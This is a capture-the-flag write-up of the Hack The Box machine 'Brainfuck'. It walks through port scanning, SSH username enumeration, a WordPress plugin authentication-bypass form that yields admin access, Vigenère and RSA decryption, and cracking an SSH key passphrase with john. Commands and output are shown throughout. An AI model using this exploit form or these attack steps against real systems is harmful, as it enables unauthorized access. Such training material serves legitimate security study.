---
title: "Hack The Box - Brainfuck"
date: 2021-10-13T22:30:30-04:00
categories:
  - WriteUp
  - HackTheBox
  - Linux
tags:
  - OSCP Preparation
  - SMTP
  - CTF
  - RSA
  - nginx
  - Nmap
  - Gobuster
---


# Introduction

---

Brainfuck is an insane box. It should be good practice for the OSCP exam, so let's just start. 

# Enumeration

---

As always, I start with an nmap scan. 

## Nmap

---

I checked for open ports, here are the results for the script scan on the open ports found:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ sudo nmap brainfuck.htb -p 22,25,110,143,443 -sV -A -O -sC                                                                                                                                                                         130 ⨯
[sudo] password for user: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-18 08:57 CEST
Nmap scan report for brainfuck.htb (10.10.10.17)
Host is up (0.081s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: CAPA PIPELINING SASL(PLAIN) UIDL USER RESP-CODES AUTH-RESP-CODE TOP
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: IMAP4rev1 more AUTH=PLAINA0001 have post-login listed capabilities Pre-login ENABLE OK IDLE SASL-IR ID LOGIN-REFERRALS LITERAL+
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-generator: WordPress 4.7.3
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Brainfuck Ltd. &#8211; Just another WordPress site
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   105.07 ms 10.10.16.1
2   105.14 ms brainfuck.htb (10.10.10.17)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.55 seconds
```

## Enumeration of Services

---

### Port 22: SSH

---

Normally, I do not enumerate this port because the SSH version is not vulnerable. But I just wanted to enumerate users to train a bit. To enumerate users, I used this:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]                                                                   
└─$ searchsploit ssh enum                                                                                             
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path                           
------------------------------------------------------------------------------------ ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                            | linux/remote/45233.py           
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                      | linux/remote/45210.py           
OpenSSH 7.2p2 - Username Enumeration                                                | linux/remote/40136.py           
OpenSSH < 7.7 - User Enumeration (2)                                                | linux/remote/45939.py           
OpenSSHd 7.2p2 - Username Enumeration                                               | linux/remote/40113.txt          
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ searchsploit -m inux/remote/40136.py         
  Exploit: OpenSSH 7.2p2 - Username Enumeration
      URL: https://www.exploit-db.com/exploits/40136
     Path: /usr/share/exploitdb/exploits/linux/remote/40136.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /hackthebox/oscp-prep/brainfuck/40136.py
```

Had to change time.clock() to time.time() so that the script worked. Now, run it:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]                                                                                                                                                                                          
└─$ python3 40136.py brainfuck.htb -U /tools/lists/usernames.txt                                                                                                                                                                             
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
User name enumeration against SSH daemons affected by CVE-2016-6210                                                                                                                                                                          
Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari                                                                                                                                                                     
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
[*] Testing SSHD at: brainfuck.htb:22, Banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1                                                                                                                                                       
[*] Getting baseline timing for authenticating non-existing users............                                                                                                                                                                
[*] Baseline mean for host brainfuck.htb is 0.5738499879837036 seconds.                                                                                                                                                                      
[*] Baseline variation for host brainfuck.htb is 0.024055111845642962 seconds.                                                                                                                                                               
[*] Defining timing of x < 0.6460153235206325 as non-existing user.                                                                                                                                                                          
[*] Testing your users...                                                                                                                                                                                                                    
[-] info - timing: 0.5696537494659424                                                                                                                                                                                                        
[-] admin - timing: 0.5848374366760254                                                                                                                                                                                                       
[+] 2000 - timing: 0.7031052112579346                                                                                                                                                                                                        
[+] michael - timing: 0.6474783420562744
[+] paul - timing: 0.7291815280914307                                                                                                                                                                                                                                                                                                                                                                                                             
[+] james - timing: 0.6500942707061768
[+] superman - timing: 0.6867907047271729
```

There are too many usernames, so this attempt does not work. It might be a rabbit hole, I can still  come back later if nothing else works.

### Port 25: SMTP

---

In nmap scan, there is command brainfuck, so I try to use it. But that does not work:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ telnet brainfuck.htb 25
Trying 10.10.10.17...
Connected to brainfuck.htb.
Escape character is '^]'.
brainfuck
220 brainfuck ESMTP Postfix (Ubuntu)
502 5.5.2 Error: command not recognized
```

I could try to enumerate the email addresses, but for this, I would need to use metasploit and I try to solve the box without it. If nothing found, this could be tried later.

### Port 110&143 : POP and IMAP

---

These ports are used for client connections, so nothing there to see.

### Port 443

---

When visiting the webpage, you can login to wordpress. That screams for wpscan, I found a plugin called WP Support Plus Responsive Ticket System 7.1.3, with an available exploit here: [exploit-db](https://www.exploit-db.com/exploits/41006). As you see in the nmap scan, there is a subdomain: sup3rs3cr3t.

I used Gobuster on both, but it only worked on one site:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ gobuster dir -u https://brainfuck.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt -x php,html,log,txt  -k                                                                                       2 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://brainfuck.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,log,txt
[+] Timeout:                 10s
===============================================================
2021/08/18 09:01:21 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 301) [Size: 0] [--> https://brainfuck.htb/]
/wp-content           (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-content/]
/wp-login.php         (Status: 200) [Size: 2244]                                       
/license.txt          (Status: 200) [Size: 19935]                                      
/wp-includes          (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-includes/]
/readme.html          (Status: 200) [Size: 7433]                                        
Progress: 26155 / 1102805 (2.37%)                                                      [ERROR] 2021/08/18 09:04:24 [!] Get "https://brainfuck.htb/wp-trackback.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/wp-admin             (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-admin/]   
Progress: 86270 / 1102805 (7.82%)                                                      [ERROR] 2021/08/18 09:11:23 [!] Get "https://brainfuck.htb/xmlrpc.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/wp-signup.php        (Status: 302) [Size: 0] [--> https://brainfuck.htb/wp-login.php?action=register]
```

But this does not help much. Wpscan could not bruteforce any passwords.

# Exploitation

---

I use the wordpress plugin exploit found above:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ searchsploit WP Support Plus Responsive Ticket System
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabil | php/webapps/34589.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalat | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection     | php/webapps/40939.txt
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                      
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ searchsploit -m php/webapps/41006.txt                
  Exploit: WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41006
     Path: /usr/share/exploitdb/exploits/php/webapps/41006.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /hackthebox/oscp-prep/brainfuck/41006.txt
                                                                                                                      
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ cat 41006.txt        
---[snip]---
2. Proof of Concept

<form method="post" action="http://wp/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>

Then you can go to admin panel.
```

So let's try this. I need the email and the username, but you can find them on the page

![Untitled](/assets/images/2021-10-13-brainfuck/Untitled.png)

So I create an index.html page with the following code:

```html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="admin">
        <input type="hidden" name="email" value="orestis@brainfuck.htb">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

I start the website and visit the page:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ sudo python3 -m http.server 80                               
[sudo] password for user: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then, I visited the [localhost](http://localhost) webpage and click `login`:

![Untitled](/assets/images/2021-10-13-brainfuck/Untitled1.png)

After the page loads (note: there is no content), I went to the main page and reload it, you will automatically be logged in as admin:

![Untitled](/assets/images/2021-10-13-brainfuck/Untitled2.png)

First, I change the password of the admin so that I can easily log in at any point of time:

![Untitled](/assets/images/2021-10-13-brainfuck/Untitled3.png)

Now, I checked the installed plugins, I found credentials in the SMTP Plugin, to view the password, look at the source code:

![Untitled](/assets/images/2021-10-13-brainfuck/Untitled4.png)

With those credentials, I log into the email account of orestis and found this email:

![Untitled](/assets/images/2021-10-13-brainfuck/Untitled5.png)

These are the credentials for the secret page. There is a lot of encrypted text, but I also have the unencrypted version of some parts. So I write a short python script to break the "vigniere chiffre":

```python
plain = "OrestisHackingforfunandprofit"
encode = "WejmvseFbtkqalzqbrsornlcwihsf"
key = str()
for (l1, l2) in zip(plain, encode):
        n = ((ord(l2) - ord(l1)) % 26) + 97
        key += chr(n)
print(key)
```

So I can crack it using cyberchef and the correct key:

[https://gchq.github.io/CyberChef/#recipe=Vigenère_Decode('fuckmybrain')](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('fuckmybrain')&input=WHVhIHp4Y2JqZSBpYWkgYyBsZWVyIG56Z3BnIGlpIHV5Li4uClVmZ29xY2JqZS4uLi4KCldlam12c2UgLSBGYnRrcWFsIHpxYiByc28gcm5sIGN3aWhzZgpZYmdicSB3cGwgZ3cgbHRvIHVkZ25qdSBmY3BwLCBDIGp5YmMgemZ1IHpycnlvbHFwIHpmdXogeGpzIHJrZXF4ZnJsIG9qd2NlZWMgSiB1b3ZnCgptbnZ6ZTovLzEwLjEwLjEwLjE3Lzh6YjVyYTEwbTkxNTIxODY5N3ExaDY1OHdmb3EwemM4L2ZybWZ5Y3Uvc3BfcHRyCgoKCg)

So I decode the following:

```
Xua zxcbje iai c leer nzgpg ii uy...
Ufgoqcbje....
Ybgbq wpl gw lto udgnju fcpp, C jybc zfu zrryolqp zfuz xjs rkeqxfrl ojwceec J uovg

mnvze://10.10.10.17/8zb5ra10m915218697q1h658wfoq0zc8/frmfycu/sp_ptr

Si rbazmvm, Q'yq vtefc gfrkr nn 

```

This is encrypted (line by line) this:

```
Say please and i just might do so...
Pleeeease....

There you go you stupid fuck, I hope you remember your key password because I dont
https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
No problem, I'll brute force it
Orestis - Hacking for fun and profit
```

Let's visit that website and download the file. With it, I can get access via SSH:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ chmod 600 id_rsa
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ python /usr/share/john/ssh2john.py id_rsa > id_rsa_hash.txt
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ john id_rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                                                                                     1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
3poulakia!       (id_rsa)
1g 0:00:00:05 DONE (2021-08-18 13:23) 0.1824g/s 2617Kp/s 2617Kc/s 2617KC/sabygurl69..*7¡Vamos!
Session completed
```

It did not work, so I cracked the key with john. The password is 3poulakia!. Let's login with SSH:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ ssh -i id_rsa orestis@brainfuck.htb                                                                                                                                                                                                255 ⨯
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

You have mail.
Last login: Wed May  3 19:46:00 2017 from 10.10.11.4
orestis@brainfuck:~$ whoami
orestis
```

An SSH shell as user orestis spawns.

## User Flag

---

I should be able to read the user flag (which lies within orestis home directory):

```bash
orestis@brainfuck:~$ cd /home
orestis@brainfuck:/home$ ls
orestis
orestis@brainfuck:/home$ cd orestis/
orestis@brainfuck:~$ ls
debug.txt  encrypt.sage  mail  output.txt  user.txt
orestis@brainfuck:~$ cat user.txt
2c**************************97c9
```

# Privesc

---

In the user folder, there is a script, which encrypts the root flag, which might be the root password, and stores it in the output.txt file. The debug file is very interesting, because the numbers are stored there. I can use them with the available script to reverse engineer the RSA encrypted passwords.

Here are the files:

```bash
orestis@brainfuck:~$ cat debug.txt 
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
orestis@brainfuck:~$ cat output.txt 
Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
```

I found a python script on [StackExchange](https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e) (which was actually the only result in my google search) that can calculate the clear text with those 4 values:

```python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

def main():
    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
    # compute n
    n = p * q
    # Compute phi(n)
    phi = (p - 1) * (q - 1)
    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a
    print( "n:  " + str(d) );
    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

if __name__ == "__main__":
    main()
```

Now, I execute the script:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ python reverse_rsa.py 
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
```

Now, I have to write a reverse function for this line of the encryption script:

```python
m = Integer(int(password.encode('hex'),16))
```

I add this line to the main function:

```python
print('This should be the flag: ' + format(pt, 'x').decode('hex'))
```

The 'x' means that the format function will convert from hex format all lower case. More about [format()](https://www.w3schools.com/python/ref_string_format.asp) on w3schools. Now, execute the script again:

```bash
┌──(user㉿KaliVM)-[/hackthebox/oscp-prep/brainfuck]
└─$ python reverse_rsa.py                                                                                                                                                                                                                1 ⚙
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
This should be the flag: 6e**************************b8ef
```

There is the flag, but sadly this is not the real password for the root account. Still a cool challange.

# Conclusions

---

The box was definitely fun to solve, but it was a bit too much CTF like for me. It was a good programming challenge. I do not think that the box is a good OSCP practice and it was not so hard that it is an insane box, but still fun to solve.